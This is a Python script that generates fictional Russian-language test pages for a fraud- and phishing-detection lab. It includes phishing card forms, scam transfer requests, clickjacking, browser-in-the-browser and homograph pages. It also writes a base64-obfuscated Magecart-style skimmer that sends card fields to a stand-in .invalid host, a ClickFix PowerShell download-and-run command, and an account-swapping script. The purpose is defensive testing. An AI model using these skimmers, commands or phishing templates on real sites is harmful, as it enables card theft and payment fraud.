"""Создаёт тестовые страницы раздела 1 (lab/pages/*.html).

Каждая страница — минимальный вымышленный сайт, на котором должна сработать одна проверка
(или, для «законных» примеров, не должна сработать ни одна). Страницы можно править вручную;
этот скрипт перезапишет их. Реквизиты получены tools/make_test_assets.py.
"""
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / 'lab' / 'pages'


def page(title, brand, letter, color, body, extra_head=''):
    return f'''<!doctype html>
<html lang="ru">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title><link rel="stylesheet" href="page.css">
<style>:root{{--c:{color}}}</style>{extra_head}</head>
<body>
<div class="site"><div class="logo">{letter}</div><b>{brand}</b><span>учебная страница · все данные вымышлены</span></div>
<main>
{body}
</main>
</body>
</html>
'''


CARD_FIELDS = '''<label for="cc">Номер карты</label><input id="cc" name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="0000 0000 0000 0000">
  <div class="row"><div><label for="exp">Срок действия</label><input id="exp" name="exp" autocomplete="cc-exp" placeholder="ММ/ГГ"></div>
  <div><label for="cvc">CVV/CVC</label><input id="cvc" name="cvc" autocomplete="cc-csc" placeholder="123"></div></div>'''

PAGES = {
    'card-form.html': page('Оплата доставки', 'ПочтаЭкспресс', 'П', '#0a7d4f', f'''
<div class="box"><span class="badge">Отправление RU-4410-2291</span>
  <h1>Оплата доставки посылки</h1>
  <p>Ваша посылка ожидает отправки. Оплатите доставку, чтобы курьер привёз её завтра.</p>
  <div class="total"><span>Доставка</span><span>349 ₽</span></div></div>
<form class="box" action="http://pay-delivery-check.ru/submit" method="post">
  {CARD_FIELDS}
  <button type="submit">Оплатить 349 ₽</button>
  <p class="muted">Форма отправляется на http://pay-delivery-check.ru — без шифрования и на чужой сайт.</p>
</form>'''),

    'card-form-legit.html': page('Оформление заказа', 'Чайная лавка «Белый лист»', 'Ч', '#7a5c2e', f'''
<div class="box"><h1>Ваш заказ</h1>
  <p>Пуэр «Старое дерево», 100 г × 2</p><p>Улун «Молочный», 50 г × 1</p>
  <div class="total"><span>Итого</span><span>1 240 ₽</span></div></div>
<form class="box" action="/pay" method="post"><h2>Оплата картой</h2>
  {CARD_FIELDS}
  <button type="submit">Оплатить 1 240 ₽</button>
  <p class="muted">Форма отправляется на тот же сайт по защищённому соединению.</p>
</form>'''),

    'receive-money.html': page('Получение оплаты', 'Барахолка.Онлайн', 'Б', '#e2572b', f'''
<div class="box"><span class="badge">Безопасная сделка</span>
  <h1>Покупатель оплатил ваш товар</h1>
  <p>Велосипед Stels Navigator 500 — <b>4 500 ₽</b>. Чтобы получить оплату на карту, заполните данные.</p></div>
<form class="box" action="/receive" method="post">
  {CARD_FIELDS}
  <label for="bal">Текущий баланс карты</label><input id="bal" name="balance" placeholder="Нужен для проверки зачисления">
  <button type="submit">Получить 4 500 ₽</button>
</form>'''),

    'secret-codes.html': page('Подтверждение доставки', 'Курьерская служба «Быстрее»', 'Б', '#5b3fd1', '''
<div class="box"><h1>Подтвердите получение посылки</h1>
  <p>Курьер уже в пути. Чтобы он передал посылку, подтвердите доставку кодом, который придёт вам в SMS.</p>
  <label for="ph">Телефон</label><input id="ph" name="phone" placeholder="+7">
  <label for="code">Код из SMS</label><input id="code" name="sms_code" placeholder="6 цифр">
  <button>Подтвердить доставку</button></div>'''),

    'manual-transfer.html': page('Оплата заказа', 'ТехноСклад', 'Т', '#1f6feb', '''
<div class="box"><h1>Ноутбук Vexa Pro 15 — скидка 50 %</h1>
  <p>Цена по акции: <b>38 990 ₽</b>. Онлайн-оплата временно не работает.</p>
  <p>Для оформления заказа переведите 38 990 ₽ на карту менеджера:</p>
  <p class="req">2202 2036 0041 5378<br>Получатель: Анна С.</p>
  <p class="muted">После перевода пришлите скриншот в чат поддержки.</p></div>'''),

    'recipient.html': page('Счёт на оплату', 'Мебель Лофт — интернет-магазин', 'М', '#3c3c3c', '''
<div class="box"><h1>Счёт на оплату заказа № 5521</h1>
  <p>Стол обеденный «Лофт», дуб — 24 700 ₽.</p>
  <p>Оплатите заказ по реквизитам:</p>
  <p class="req">Получатель: Петров Иван Сергеевич<br>Счёт: 40817810300000067890<br>БИК: 044599123<br>Банк: АО «Банк Северный»</p></div>'''),

    'safe-account.html': page('Служба безопасности', 'Служба безопасности банка «Северный»', 'С', '#b42318', '''
<div class="box"><h1>Ваши средства под угрозой</h1>
  <p>Зафиксирована попытка оформить кредит на ваше имя. Чтобы сохранить деньги, немедленно переведите их на безопасный счёт:</p>
  <p class="req">Счёт: 42301810600000054321<br>БИК: 044599123<br>Получатель: Смирнов Олег Андреевич</p>
  <p>Деньги будут возвращены после проверки в течение 24 часов.</p></div>'''),

    'recipient-legit.html': page('Реквизиты для оплаты', 'ООО «УК Уютный дом»', 'У', '#0e7490', '''
<div class="box"><h1>Реквизиты для оплаты услуг</h1>
  <p>Управляющая компания ООО «УК Уютный дом». Оплату по счёту можно внести в приложении банка по реквизитам:</p>
  <p class="req">Получатель: ООО «УК Уютный дом»<br>ИНН 7701234560<br>Счёт: 40702810300000012345<br>БИК: 044599123</p></div>'''),

    'qr-code.html': page('Квитанция ЖКУ', 'ООО «УК Уютный дом»', 'У', '#0e7490', '''
<div class="box"><h1>Квитанция за октябрь</h1>
  <p>Управляющая компания ООО «УК Уютный дом», лицевой счёт 100245.</p>
  <div class="total"><span>К оплате</span><span>3 950 ₽</span></div></div>
<div class="box qr"><img src="img/qr-fake.png" alt="QR-код для оплаты"><p>Отсканируйте QR-код в приложении банка — реквизиты подставятся автоматически.</p></div>'''),

    'qr-sbp-fake.html': page('Оплата по QR', 'Кафе «Ромашка»', 'Р', '#c2410c', '''
<div class="box"><h1>Ваш счёт</h1><p>Капучино, сырники, морс.</p>
  <div class="total"><span>Итого</span><span>1 290 ₽</span></div></div>
<div class="box qr"><img src="img/qr-sbp-fake.png" alt="QR СБП"><p>Оплатите по QR-коду через Систему быстрых платежей.</p></div>'''),

    'qr-code-legit.html': page('Квитанция ЖКУ', 'ООО «УК Уютный дом»', 'У', '#0e7490', '''
<div class="box"><h1>Квитанция за октябрь</h1>
  <p>Управляющая компания ООО «УК Уютный дом», лицевой счёт 100245.</p>
  <div class="total"><span>К оплате</span><span>3 950 ₽</span></div></div>
<div class="box qr"><img src="img/qr-legit.png" alt="QR-код для оплаты"><p>Отсканируйте QR-код в приложении банка — реквизиты подставятся автоматически.</p></div>'''),

    'amount-mismatch.html': page('Оформление заказа', 'Кроссовки.ру', 'К', '#111827', '''
<div class="box"><h1>Ваш заказ</h1><p>Кроссовки Runner Air, размер 42</p>
  <div class="total"><span>Итого</span><span>1 990 ₽</span></div></div>
<form class="box" action="/pay" method="post"><input type="hidden" name="amount" value="2380">
  <p>Оплата картой на следующем шаге.</p><button type="submit">Оплатить 2 380 ₽</button></form>'''),

    'deceptive-button.html': page('Пробный доступ', 'КиноПоток', 'К', '#7c3aed', '''
<div class="box"><h1>7 дней кино бесплатно</h1>
  <p>Смотрите фильмы и сериалы без рекламы. Подключите пробный доступ.</p>
  <a class="button" href="/checkout/pay?plan=year&amp;sum=5990&amp;autorenew=1">Получить бесплатно</a>
  <p class="muted">Мелким шрифтом: после пробного периода спишется 5 990 ₽ за год.</p></div>'''),

    'clickjacking.html': page('Розыгрыш', 'Призы каждый день', 'П', '#db2777', '''
<div class="box" style="position:relative">
  <h1>Поздравляем! Вы выиграли смартфон</h1>
  <p>Нажмите кнопку, чтобы забрать приз.</p>
  <button id="prize" style="height:56px">Забрать приз</button>
  <iframe src="clickjack-target.html" title="hidden" style="position:absolute;left:22px;right:22px;bottom:22px;width:calc(100% - 44px);height:56px;border:0;opacity:0.01"></iframe>
</div>'''),

    'clickjack-target.html': '''<!doctype html><html lang="ru"><meta charset="utf-8"><body style="margin:0">
<form action="/bank/transfer/confirm"><button style="width:100%;height:56px;background:#b42318;color:#fff;border:0;font:700 16px system-ui">Подтвердить перевод 15 000 ₽</button></form></body></html>''',

    'form-overlay.html': page('Оплата заказа', 'Чайная лавка «Белый лист»', 'Ч', '#7a5c2e', '''
<div class="box"><h1>Оплата заказа № 1187</h1><div class="total"><span>Итого</span><span>1 240 ₽</span></div></div>
<div class="box" id="pay" style="position:relative"><h2>Окно оплаты платёжного провайдера</h2>
  <iframe src="https://pay-psp.test/widget?order=1187" title="Оплата" style="width:100%;height:230px;border:1px solid #e4e7ee;border-radius:10px"></iframe>
</div>
<script>
// Учебный «скиммер»: через секунду рисует свою форму поверх окна провайдера.
setTimeout(function () {
  var f = document.createElement('form');
  f.style.cssText = 'position:absolute;left:22px;right:22px;top:62px;height:230px;background:#fff;border:1px solid #e4e7ee;border-radius:10px;padding:14px';
  f.innerHTML = '<label>Номер карты</label><input name="cardnumber" autocomplete="cc-number" placeholder="0000 0000 0000 0000">' +
    '<label>Срок</label><input name="exp" placeholder="ММ/ГГ"><label>CVV</label><input name="cvv" placeholder="123">';
  document.getElementById('pay').appendChild(f);
}, 800);
</script>'''),

    'script-inventory.html': page('Оформление заказа', 'Чайная лавка «Белый лист»', 'Ч', '#7a5c2e', f'''
<div class="box"><h1>Оплата заказа</h1><div class="total"><span>Итого</span><span>1 240 ₽</span></div></div>
<form class="box" action="/pay" method="post">{CARD_FIELDS}<button>Оплатить 1 240 ₽</button></form>
<script src="https://cdn.metrics-counter.invalid/c.js"></script>
<script>
// Учебный запутанный код: на деле только пишет строку в консоль.
eval(atob('Y29uc29sZS5sb2coIm1ldHJpY3MgbG9hZGVkIik7'));
var _0x = String.fromCharCode(109,101,116,114,105,99,115,95,111,107);
</script>'''),

    'skimmer.html': page('Оформление заказа', 'Чайная лавка «Белый лист»', 'Ч', '#7a5c2e', f'''
<div class="box"><h1>Оплата заказа</h1><p>Пуэр «Старое дерево», 100 г × 2</p><div class="total"><span>Итого</span><span>1 240 ₽</span></div></div>
<form class="box" action="/pay" method="post">{CARD_FIELDS}<button type="button">Оплатить 1 240 ₽</button></form>
<script src="js/analytics.js"></script>'''),

    'requisites-swap.html': page('Счёт на оплату', 'ООО «Ремонт-Сервис»', 'Р', '#0f766e', '''
<div class="box"><h1>Счёт на оплату № 245</h1><p>Ремонт стиральной машины — 6 400 ₽.</p>
  <p>Оплатите по реквизитам организации:</p>
  <p class="req">Получатель: ООО «Ремонт-Сервис»<br>Счёт: <span id="acc">40702810700000098765</span><br>БИК: 044599123</p></div>
<script src="js/widget.js"></script>'''),

    'pressure.html': page('Бронирование', 'Отель «Морской бриз»', 'О', '#0369a1', '''
<div class="box"><span class="badge">Осталось 1 место</span><h1>Номер «Стандарт», 3 ночи</h1>
  <p>Ваша бронь истекает через <b id="t">09:59</b>! Оплатите сейчас, иначе бронь будет отменена.</p>
  <div class="total"><span>К оплате</span><span>14 700 ₽</span></div>
  <a class="button" href="/pay">Оплатить бронь</a></div>
<script>var s=599;setInterval(function(){s--;document.getElementById('t').textContent=String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0')},1000);</script>'''),

    'clickfix.html': page('Проверка безопасности', 'БилетЭкспресс', 'Б', '#0f766e', """
<div class="box" style="text-align:center"><h1>Подтвердите, что вы не робот</h1>
  <p>Чтобы перейти к оплате билетов, пройдите проверку.</p>
  <button id="cap">☐ Я не робот</button>
  <div class="box" style="text-align:left;margin-top:14px"><b>Шаги проверки:</b>
    <p>1. Нажмите Win + R</p><p>2. Нажмите Ctrl + V</p><p>3. Нажмите Enter</p></div></div>
<script>
// Учебный пример ClickFix: команда только копируется в буфер, адрес .invalid не существует.
document.getElementById('cap').onclick = function () {
  navigator.clipboard.writeText('powershell -w h -c "iwr https://update-check.invalid/v.ps1 | iex" # Я не робот: проверка ID 4471');
};
</script>"""),

    'fake-app.html': page('Защита счёта', 'Банк «Северный» — служба безопасности', 'С', '#b42318', """
<div class="box"><h1>Отмена подозрительной операции</h1>
  <p>С вашей карты пытаются списать 48 000 ₽. Чтобы отменить операцию, установите приложение «Северный Защита» и приложите карту к телефону.</p>
  <a class="button" href="files/severny-zashita.apk" download>Скачать приложение (.apk)</a>
  <p class="muted">Если приложение не устанавливается, установите AnyDesk и сообщите сотруднику код подключения.</p></div>"""),

    'homograph.html': page('Уведомление', 'Банк «Северный»', 'С', '#1d4ed8', """
<div class="box"><h1>Подтвердите данные до 05.11.2026</h1>
  <p>Чтобы карта не была заблокирована, войдите в личный кабинет и подтвердите данные.</p>
  <a class="button" href="https://bank-s\u0435verny.ru/login">Войти в личный кабинет</a>
  <p class="muted">Ссылка выглядит как bank-severny.ru, но буква «е» в ней — кириллическая.</p></div>"""),

    'bitb.html': page('Оформление заказа', 'ТехноМаркет', 'Т', '#1d4ed8', """
<div class="box"><h1>Оформление заказа № 88412</h1><p>Войдите через банк, чтобы оплатить заказ в одно касание.</p>
  <div class="total"><span>Итого</span><span>12 490 ₽</span></div></div>
<div style="position:fixed;left:50%;top:60px;transform:translateX(-50%);width:420px;height:380px;background:#fff;border:1px solid #c8ccd4;border-radius:10px;box-shadow:0 20px 50px rgba(0,0,0,.3);font:14px system-ui">
  <div style="background:#f1f3f4;padding:8px 12px;border-radius:10px 10px 0 0;display:flex;justify-content:space-between"><span>Вход — Банк «Северный»</span><span>✕</span></div>
  <div style="margin:6px 10px;padding:6px 10px;background:#f1f3f4;border-radius:16px;color:#333">🔒 https://id.bank-severny.ru/oauth/login</div>
  <div style="padding:14px 20px"><b>Банк «Северный» ID</b>
    <label>Логин</label><input name="login"><label>Пароль</label><input type="password" name="password">
    <button>Войти и оплатить</button></div></div>"""),
}

JS = {
    # Учебный скиммер в стиле Magecart: маскируется под аналитику, адрес спрятан в base64.
    'analytics.js': '''/* analytics v2.1 — учебный пример веб-скиммера (Magecart). Никуда реально не отправляет: адрес .invalid не существует. */
(function () {
  var d = {};
  var u = atob('aHR0cHM6Ly9zdGF0aWMtY2RuLW1ldHJpY3MuaW52YWxpZC9wLmdpZg==');
  document.querySelectorAll('input[autocomplete^="cc-"]').forEach(function (el) {
    el.addEventListener('blur', function () {
      d[el.name] = el.value;
      new Image().src = u + '?d=' + btoa(JSON.stringify(d));
    });
  });
})();
''',
    # Учебная подмена реквизитов: через 1,5 секунды подставляет счёт «дропа».
    'widget.js': '''/* Учебный пример: вредоносный код подменяет счёт получателя после загрузки страницы. */
setTimeout(function () {
  document.getElementById('acc').textContent = '40817810300000067890';
}, 1500);
''',
}

if __name__ == '__main__':
    for name, html in PAGES.items():
        (OUT / name).write_text(html, encoding='utf-8')
    (OUT / 'js').mkdir(exist_ok=True)
    for name, code in JS.items():
        (OUT / 'js' / name).write_text(code, encoding='utf-8')
    print('Создано страниц:', len(PAGES), 'скриптов:', len(JS))
